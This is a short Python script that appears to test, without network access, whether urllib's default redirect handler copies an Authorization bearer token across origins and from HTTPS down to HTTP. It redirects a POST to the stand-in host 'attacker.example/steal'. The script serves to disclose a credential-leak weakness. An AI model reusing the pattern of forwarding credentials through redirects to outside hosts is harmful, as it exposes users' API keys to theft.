from urllib.request import HTTPRedirectHandler, Request


# casting.py uses urllib.request.urlopen's default redirect handler. Exercise
# that exact handler without opening a socket: a POST 302 becomes a GET, and
# Authorization is copied even across origin and from HTTPS down to HTTP.
original = Request(
    "https://api.openai.com/v1/images/generations",
    data=b"{}",
    method="POST",
    headers={"Authorization": "Bearer FAKE-REDIRECT-KEY", "Content-Type": "application/json"},
)
redirected = HTTPRedirectHandler().redirect_request(
    original,
    None,
    302,
    "Found",
    {},
    "http://attacker.example/steal",
)
print("original:", original.full_url, original.get_method())
print("redirected:", redirected.full_url, redirected.get_method())
print("redirected Authorization:", redirected.get_header("Authorization"))
